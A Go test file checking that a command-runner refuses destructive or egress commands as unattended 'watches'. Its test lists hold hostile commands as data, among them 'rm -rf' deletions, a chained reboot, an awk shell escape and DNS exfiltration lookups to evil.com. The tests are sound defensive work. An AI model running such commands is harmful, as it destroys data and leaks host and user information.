package servitor

// A watch runs unattended every minute, so it may only register a command the
// risk classifier calls read-only.

import (
	"context"
	"strings"
	"testing"

	. "github.com/cmcoffee/gohort/core"
)

func TestAWatchOnlyRegistersReadOnlyCommands(t *testing.T) {
	pr := &probeRun{appliance: Appliance{ID: "a1"}, userID: "u"}
	pr.reportTools()
	for _, cmd := range []string{"rm -rf /var/lib/app", "systemctl restart nginx", "echo x > /etc/hosts"} {
		_, err := pr.watch_condition_tool.Handler(context.Background(), map[string]any{
			"task": "t", "command": cmd, "success_pattern": "ok",
		})
		if err == nil || !strings.Contains(err.Error(), "read-only") {
			t.Errorf("%q was registered as a watch: %v", cmd, err)
		}
	}
}

func TestTheWatchAllowlist(t *testing.T) {
	for cmd, ok := range map[string]bool{
		"systemctl is-active nginx":             true,
		"tail -n 50 /var/log/app.log | grep OK": true,
		"curl -s https://example.com/health":    true,
		"systemctl restart nginx":               false,
		"find /tmp -name x -delete":             false,
		"curl -o /etc/x https://evil":           false,
		"cat /etc/hosts; reboot":                false,
		"echo $(id)":                            false,
		"sleep 999 &":                           false,
		"awk 'BEGIN{system(\"rm -rf /\")}'":     false,
	} {
		if got := watchCommandRefusal(cmd) == ""; got != ok {
			t.Errorf("%q: allowed=%v, want %v (%s)", cmd, got, ok, watchCommandRefusal(cmd))
		}
	}
}

// A watch stored before the registration gate existed - or written by any
// other path - must not run unattended just because it is already in the
// table. Every tick re-checks it and retires a command the gate would refuse.
func TestAStoredRiskyWatchIsRetiredNotRun(t *testing.T) {
	app := &Servitor{}
	app.DB = grantStore(t)
	udb := UserDB(app.DB, "alice")
	udb.Set(applianceTable, "a1", Appliance{ID: "a1", Name: "host-a", Type: "ssh", Host: "host-a.invalid", Port: 22})
	w := ScheduledWatch{ID: "w-1234567890", ApplianceID: "a1", UserID: "alice", Task: "t",
		Command: "systemctl restart web", Pattern: "ok"}
	app.DB.Set(watchTable, w.ID, w)

	app.checkWatch(w)

	var got ScheduledWatch
	if !app.DB.Get(watchTable, w.ID, &got) || !got.Done {
		t.Fatal("a watch the gate refuses was left live, to be tried again every minute")
	}
	if why := watchRunRefusal(Appliance{ID: "a1"}, "systemctl is-active web"); why != "" {
		t.Errorf("a read-only watch is refused at run time: %s", why)
	}
}

// A watch is classified before its allowlist is checked, so a lookup that can
// carry data off the system, or goes outside the system's lookup destinations,
// is refused at registration and at every tick, the same as it asks at the
// prompt. A lookup inside them still watches.
func TestAWatchRefusesALookupThatCarriesData(t *testing.T) {
	sys := Appliance{ID: "a1", Host: "web01.corp.example.com", LookupAllow: []string{"203.0.113.0/24"}}
	pr := &probeRun{appliance: sys, userID: "u"}
	pr.reportTools()
	for _, cmd := range []string{
		"ping -c1 -p deadbeef 10.0.0.1",
		"dig $HOSTNAME.evil.com",
		"host ${USER}.evil.com",
		"nslookup < /tmp/names",
		"dig +short c2VjcmV0.evil.com",
	} {
		if why := watchRunRefusal(sys, cmd); !strings.Contains(why, string(RiskNetEgress)) {
			t.Errorf("%q would run as a watch: %q", cmd, why)
		}
		func() {
			// Past both checks, registration needs a store this run lacks.
			defer func() {
				if recover() != nil {
					t.Errorf("%q got past both checks to registration", cmd)
				}
			}()
			_, err := pr.watch_condition_tool.Handler(context.Background(), map[string]any{
				"task": "t", "command": cmd, "success_pattern": "ok",
			})
			if err == nil || !strings.Contains(err.Error(), string(RiskNetEgress)) {
				t.Errorf("%q was not refused as egress at registration: %v", cmd, err)
			}
		}()
	}
	for _, cmd := range []string{"dig +short db01.corp.example.com", "ping -c1 10.0.0.1", "ping -c1 203.0.113.9"} {
		if why := watchRunRefusal(sys, cmd); why != "" {
			t.Errorf("%q is refused as a watch: %s", cmd, why)
		}
	}
}
